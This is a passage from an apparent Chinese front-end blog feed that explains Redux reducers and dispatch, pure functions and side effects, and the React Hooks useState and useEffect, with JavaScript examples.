class="line"><span class="comment">// 创建 store</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// action =&gt; &#123; type: 'increment' &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state = <span class="number">10</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'reducer:'</span>, state, action)</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">store.dispatch(increment())</span><br><span class="line"><span class="comment">// 相当于：store.dispatch(&#123; type: 'increment' &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'store 状态值为：'</span>, store.getState())</span><br></pre></td></tr></table></figure><h2 id="Redux-执行过程分析"><a href="#Redux-执行过程分析" class="headerlink" title="Redux-执行过程分析"></a>Redux-执行过程分析</h2><ol><li>创建 store 时，Redux 就会先调用一次 reducer，来获取到默认状态</li><li>分发动作 <code>store.dispatch(action)</code>更新状态</li><li>Redux store 调用 reducer 传入：上一次的状态（当前示例中就是：<code>10</code>）和 action（<code>{ type: &#39;increment&#39; }</code>），计算出新的状态并返回</li><li>reducer 执行完毕后，将最新的状态交给 store，store 用最新的状态替换旧状态，状态更新完毕</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; legacy_createStore <span class="keyword">as</span> createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reducer(10, &#123; type: 'increment' &#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state = <span class="number">10</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'reducer:'</span>, state, action)</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'状态值为：'</span>, store.getState()) <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 发起更新状态：</span></span><br><span class="line"><span class="comment">// 参数： action 对象</span></span><br><span class="line">store.dispatch(&#123; <span class="attr">type</span>: <span class="string">'increment'</span> &#125;)</span><br><span class="line"><span class="comment">// 相当于： reducer(10, &#123; type: 'increment' &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'更新后：'</span>, store.getState()) <span class="comment">// 11</span></span><br></pre></td></tr></table></figure><h2 id="纯函数-amp-JS副作用"><a href="#纯函数-amp-JS副作用" class="headerlink" title="纯函数&amp;JS副作用"></a>纯函数&amp;JS副作用</h2><p>纯函数：</p><ul><li>纯函数是<em>函数式编程</em>中的概念，对于纯函数来说，<strong>相同的输入总是得到相同的输出</strong></li><li>参考资料：<a href="https://www.ruanyifeng.com/blog/2012/04/functional_programming.html" target="_blank" rel="noopener">函数式编程初探</a></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 纯函数：</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line">add() <span class="comment">// 123</span></span><br><span class="line">add() <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 3</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line">add(&#123; <span class="attr">name</span>: <span class="string">'jack'</span> &#125;) <span class="comment">// &#123; name: 'jack' &#125;</span></span><br><span class="line">add(&#123; <span class="attr">name</span>: <span class="string">'jack'</span> &#125;) <span class="comment">// &#123; name: 'jack' &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不是纯函数：</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.random()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add() <span class="comment">// 0.12311293827497123</span></span><br><span class="line">add() <span class="comment">// 0.82239841238741814</span></span><br></pre></td></tr></table></figure><p>JS副作用：</p><ul><li>如果一个函数或其他操作<strong>修改了其局部环境之外的状态变量值</strong>，那么它就被称为有副作用</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无副作用</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有副作用：</span></span><br><span class="line"><span class="keyword">let</span> c = <span class="number">0</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 函数外部的环境产生了影响，所以是有副作用的</span></span><br><span class="line">  c = <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有副作用</span></span><br><span class="line"><span class="keyword">const</span> add = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 因为直接修改了参数的值，对外部的数据产生了影响</span></span><br><span class="line">obj.num = <span class="number">123</span></span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> o = &#123;&#125;</span><br><span class="line">add(o)</span><br><span class="line"><span class="built_in">console</span>.log(o) <span class="comment">// &#123; num: 123 &#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Redux-概念&quot;&gt;&lt;a href=&quot;#Redux-概念&quot; class=&quot;headerlink&quot; title=&quot;Redux-概念&quot;&gt;&lt;/a&gt;Redux-概念&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Redux 是 React 中最常用的状态管理工具（状态容器）&lt;/
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Redux" scheme="//www.shen.ee/tags/Redux/"/>
    
      <category term="Redux状态管理工具" scheme="//www.shen.ee/tags/Redux%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="状态管理工具" scheme="//www.shen.ee/tags/%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
      <category term="action" scheme="//www.shen.ee/tags/action/"/>
    
      <category term="reducer" scheme="//www.shen.ee/tags/reducer/"/>
    
      <category term="store" scheme="//www.shen.ee/tags/store/"/>
    
  </entry>
  
  <entry>
    <title>深入浅出Hooks</title>
    <link href="//www.shen.ee/article/25844.html"/>
    <id>//www.shen.ee/article/25844.html</id>
    <published>2022-06-15T03:38:39.000Z</published>
    <updated>2022-06-22T06:24:26.007Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hooks-介绍"><a href="#Hooks-介绍" class="headerlink" title="Hooks-介绍"></a>Hooks-介绍</h2><ul><li>hooks 解释<ul><li><code>Hooks</code>：钩子、钓钩、钩住 ，<code>Hooks</code> 是 <strong>React v16.8</strong> 中的新增功能</li></ul></li><li>hooks 作用<ul><li>为<strong>函数组件</strong>提供状态、生命周期等原本 class 组件中提供的 React 功能</li><li>可以理解为通过 Hooks 为函数组件钩入 class 组件的特性</li><li>注意：<strong>Hooks 只能在函数组件中使用</strong>，自此，函数组件成为 React 的新宠儿</li></ul></li><li>React v16.8 版本前后，组件开发模式的对比<ul><li>React v16.8 以前： class 组件(提供状态) + 函数组件(展示内容)</li><li>React v16.8 及其以后：<ol><li>class 组件(提供状态) + 函数组件(展示内容)</li><li>Hooks(提供状态) + 函数组件(展示内容)</li><li>混用以上两种方式：部分功能用 class 组件，部分功能用 Hooks+函数组件</li></ol></li></ul></li></ul><p><strong>总结</strong>：</p><ul><li>虽然有了 Hooks，但 React 官方并没有计划从 React 库中移除 class</li><li>有了 Hooks 以后，不能再把<strong>函数组件</strong>称为<del>无状态组件</del>了，因为 Hooks 为函数组件提供了状态</li></ul><h2 id="Hooks-解决的问题"><a href="#Hooks-解决的问题" class="headerlink" title="Hooks-解决的问题"></a>Hooks-解决的问题</h2><ol><li>组件的状态逻辑复用问题<ul><li>在 Hooks 之前，组件的状态逻辑复用经历了：mixins（混入）、HOCs（高阶组件）、render-props 等模式</li><li>（早已废弃）mixins 的问题：1 数据来源不清晰 2 命名冲突</li><li>HOCs、render-props 的问题：重构组件结构，导致组件形成 JSX 嵌套地狱问题</li></ul></li><li>class 组件自身的问题<ul><li>选择：函数组件和 class 组件之间的区别以及使用哪种组件更合适</li><li>需要理解 class 中的 this 是如何工作的</li><li>相互关联且需要对照修改的代码被拆分到不同生命周期函数中</li><li>相比于函数组件来说，不利于代码压缩和优化，也不利于 TS 的类型推导</li></ul></li></ol><h2 id="Hooks-渐进策略"><a href="#Hooks-渐进策略" class="headerlink" title="Hooks-渐进策略"></a>Hooks-渐进策略</h2><ol><li>什么是渐进式策略（项目开发场景）<a href="https://zh-hans.reactjs.org/docs/hooks-intro.html" target="_blank" rel="noopener">文档</a><ul><li>不推荐直接使用 Hooks 大规模重构现有组件</li><li>推荐：新功能用 Hooks，复杂功能实现不了的，也可以继续用 class</li><li>找一个功能简单、非核心功能的组件开始使用 hooks</li></ul></li><li>在 hooks 中开发会使用那些知识？<ul><li>class 组件相关的 API 在 hooks 中不可用<ul><li>class 自身语法，比如，constructor、static 等</li><li>钩子函数，<code>componentDidMount</code>、<code>componentDidUpdate</code>、<code>componentWillUnmount</code></li><li><code>this</code> 相关的用法</li></ul></li><li>原来学习的 React 内容还是要用的<ul><li>JSX：<code>{}</code>、<code>onClick={handleClick}</code>、条件渲染、列表渲染、样式处理等</li><li>组件：函数组件、组件通讯</li><li>React 开发理念：<code>单向数据流</code>、<code>状态提升</code> 等</li><li>解决问题的思路、技巧、常见错误的分析等</li></ul></li></ul></li></ol><p><strong>总结</strong>：</p><ol><li>react 没有计划从 React 中移除 class</li><li>react 将继续为 class 组件提供支持</li><li>可以在项目中同时使用 hooks 和 class</li></ol><h2 id="useState-基本使用"><a href="#useState-基本使用" class="headerlink" title="useState-基本使用"></a>useState-基本使用</h2><h3 id="useState-作用"><a href="#useState-作用" class="headerlink" title="useState 作用"></a>useState 作用</h3><ul><li>为函数组件提供状态</li><li>它是一个 hook，就是一个特殊的函数，让你在函数组件中获取状态等 React 特性。</li><li>名称上看 hook 都以<code>use</code>开头<code>useXxx</code></li></ul><h3 id="useState-语法"><a href="#useState-语法" class="headerlink" title="useState 语法"></a>useState 语法</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数：状态初始值(数值、字符串、数组，对象)</span></span><br><span class="line"><span class="comment">// 返回值：stateArray 是一个数组</span></span><br><span class="line"><span class="keyword">const</span> stateArray = useState(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 索引 0 表示：状态值（state）</span></span><br><span class="line"><span class="keyword">const</span> state = stateArray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 索引 1 表示：修改状态的函数（setState）</span></span><br><span class="line"><span class="keyword">const</span> setState = stateArray[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><h3 id="useState-使用步骤"><a href="#useState-使用步骤" class="headerlink" title="useState 使用步骤"></a>useState 使用步骤</h3><ol><li>导入 <code>useState</code> hook</li><li>调用 <code>useState</code> 函数，并传入状态的初始值</li><li>从 <code>useState</code> 函数的返回值中，拿到状态和修改状态的函数</li><li>在 JSX 中展示状态</li><li>在按钮的点击事件中调用修改状态的函数，来更新状态</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Count = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// stateArray 是一个数组</span></span><br><span class="line">  <span class="keyword">const</span> stateArray = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> state = stateArray[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> setState = stateArray[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;<span class="comment">/* 展示状态值 */</span>&#125;</span><br><span class="line">      &lt;h1&gt;状态为：&#123;state&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &#123;/</span>* 点击按钮，让状态值 +<span class="number">1</span> *<span class="regexp">/&#125;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setState(state + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="useState-写法正确姿势"><a href="#useState-写法正确姿势" class="headerlink" title="useState 写法正确姿势"></a>useState 写法正确姿势</h3><ul><li>数据函数需要符合业务语义，修改状态的函数名称以 <strong>set</strong> 开头，后面跟上状态的名称。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Count = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 解构：</span></span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;state&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setState(state + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><p>给<code>useState</code>提供初始化值，返回数组。</p><ul><li>数组[0] 状态数据</li><li>数组[1] 修改状态函数</li></ul></li><li><p>参考写法：<code>const [count, setCount] = useState(0)</code></p></li></ul><h2 id="useState-读取和修改状态"><a href="#useState-读取和修改状态" class="headerlink" title="useState-读取和修改状态"></a>useState-读取和修改状态</h2><h3 id="读取状态"><a href="#读取状态" class="headerlink" title="读取状态"></a>读取状态</h3><ul><li>读取状态：<code>useState</code> 提供的状态，是函数内部的局部变量，可以在函数内的任意位置使</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> UserCom = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [user, setUser] = useState(&#123; <span class="attr">name</span>: <span class="string">'jack'</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;姓名：&#123;user.name&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;p&gt;年龄：&#123;user.age&#125;&lt;/</span>p&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="修改状态"><a href="#修改状态" class="headerlink" title="修改状态"></a>修改状态</h3><ul><li><code>setCount(newValue)</code> 是一个函数，参数表示：<strong>新的状态值</strong></li><li>调用该函数后，将<strong>使用新的状态值<code>替换</code>旧值</strong></li><li>修改状态后，因为状态发生了改变，所以该组件会重新渲染</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> UserCom = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [user, setUser] = useState(&#123; <span class="attr">name</span>: <span class="string">'jack'</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> onAgeAdd = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setUser(&#123;</span><br><span class="line">      ...user,</span><br><span class="line">      age: user.age + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;姓名：&#123;user.name&#125;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;p&gt;年龄：&#123;user.age&#125;&lt;/</span>p&gt;</span><br><span class="line">      &lt;button onClick=&#123;onAgeAdd&#125;&gt;年龄+<span class="number">1</span>&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>修改状态的时候，一定要<strong>使用新的状态替换旧的状态</strong></li></ul><h2 id="useState-组件更新过程"><a href="#useState-组件更新过程" class="headerlink" title="useState-组件更新过程"></a>useState-组件更新过程</h2><h3 id="组件初始化时候的事情"><a href="#组件初始化时候的事情" class="headerlink" title="组件初始化时候的事情"></a>组件初始化时候的事情</h3><ol><li>从头开始执行该组件中的代码逻辑</li><li>调用 <code>useState(0)</code> 将传入的参数作为状态初始值，即：0</li><li>渲染组件，此时，获取到的状态 count 值为： 0</li></ol><h3 id="setState-后发生的事情"><a href="#setState-后发生的事情" class="headerlink" title="setState 后发生的事情"></a>setState 后发生的事情</h3><ol><li>点击按钮，调用 <code>setCount(count + 1)</code> 修改状态，因为状态发生改变，所以，该组件会重新渲染</li><li>组件重新渲染时，会再次执行该组件中的代码逻辑</li><li>再次调用 <code>useState(0)</code>，此时 <strong>React 内部会拿到最新的状态值而非初始值</strong>，比如，该案例中最新的状态值为 1</li><li>再次渲染组件，此时，获取到的状态 count 值为：1</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">const</span> Counter = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><strong>useState 的初始值(参数)只会在组件第一次渲染时生效</strong>，以后的每次渲染，useState 获取到都是最新的状态值。</li></ul><h2 id="useState-使用原则"><a href="#useState-使用原则" class="headerlink" title="useState-使用原则"></a>useState-使用原则</h2><h3 id="定义多个状态的原则"><a href="#定义多个状态的原则" class="headerlink" title="定义多个状态的原则"></a>定义多个状态的原则</h3><ul><li>调用 <code>useState</code> Hook 多次即可，每调用一次 useState Hook 可以提供一个状态</li><li><code>useState Hook</code> 多次调用返回的 [state, setState]，相互之间，互不影响</li><li>尽量按照业务来定义数据，不要全部定义在一起，因为是替换，不是合并</li></ul><h3 id="hook-函数书写位置原则"><a href="#hook-函数书写位置原则" class="headerlink" title="hook 函数书写位置原则"></a>hook 函数书写位置原则</h3><ul><li><strong>React Hooks 只能直接出现在 函数组件 中</strong></li><li><strong>React Hooks 不能嵌套在 if/for/其他函数 中</strong></li><li>原理：React 是按照 Hooks 的调用顺序来识别每一个 Hook，如果每次调用的顺序不同，导致 React 无法知道是哪一个 Hook</li></ul><p>可以通过开发者工具进行查看组件的 hooks</p><p><img src="https://oss.iyouhun.com/img/md/01.053a5fe6.png" alt="01.053a5fe6"></p><p><strong>总结：</strong></p><ul><li>只能在函数组件中使用，不能嵌套在 <code>分支循环语句</code> 中，react 存储 hooks 状态按顺序存储。</li></ul><h2 id="useEffect-副作用"><a href="#useEffect-副作用" class="headerlink" title="useEffect-副作用"></a>useEffect-副作用</h2><ol><li><code>side effect</code> 副作用专业解释<ul><li>在计算机科学中，如果一个函数或其他操作修改了其局部环境之外的状态变量值，那么它就被称为有副作用</li><li>在函数组件中：职责就行根据状态渲染 UI，其他的事情都是副作用</li></ul></li><li>通过生活例子，理解副作用<ul><li>999 感冒灵，主作用：用于感冒引起的头痛，发热，鼻塞，流涕，咽痛等</li><li>副作用：可见困倦、嗜睡、口渴、虚弱感</li></ul></li><li>使用函数组件常见的副作用<ul><li>对于 React 组件来说，<strong>主作用就是根据数据（state/props）渲染 UI</strong>，除此之外都是副作用（比如，手动修改 DOM）</li><li>常见的副作用（side effect）：数据（Ajax）请求、手动修改 DOM、localStorage、console.log 操作等</li><li>当你想要在函数组件中，<strong>处理副作用（side effect）时</strong>，就要使用 <strong>useEffect</strong> Hook 了</li></ul></li></ol><p><strong>总结：</strong></p><ul><li>对于 react 组件来说，除了渲染 UI 之外的其他操作，都可以称之为副作用</li></ul><h2 id="useEffect-基本使用"><a href="#useEffect-基本使用" class="headerlink" title="useEffect-基本使用"></a>useEffect-基本使用</h2><h3 id="语法介绍"><a href="#语法介绍" class="headerlink" title="语法介绍"></a>语法介绍</h3><ul><li>参数：回调函数（称为 <strong>effect</strong>），就是<strong>在该函数中写副作用代码</strong></li><li>执行时机：该 effect 会在组件第一次渲染以及每次组件更新后执行</li><li>相当于 componentDidMount + componentDidUpdate</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 书写副作用代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>例：count 更新的时候显示到标题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Counter = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`当前已点击 <span class="subst">$&#123;count&#125;</span> 次`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>在函数组件处理副作用 <code>useEffect(()=&gt;{})</code> 组件初始化，更新的时候执行</li></ul><h2 id="useEffect-依赖项"><a href="#useEffect-依赖项" class="headerlink" title="useEffect-依赖项"></a>useEffect-依赖项</h2><h3 id="默认使用-useEffect-的问题"><a href="#默认使用-useEffect-的问题" class="headerlink" title="默认使用 useEffect 的问题"></a>默认使用 useEffect 的问题</h3><ul><li><code>useEffect(()=&gt;{})</code> 只要状态发生更新 useEffect 的 effect 回调就会执行</li><li>如果组件中有另外一个状态，另一个状态更新时，刚刚的 effect 回调也会执行</li></ul><h3 id="useEffect-依赖项的使用"><a href="#useEffect-依赖项的使用" class="headerlink" title="useEffect 依赖项的使用"></a>useEffect 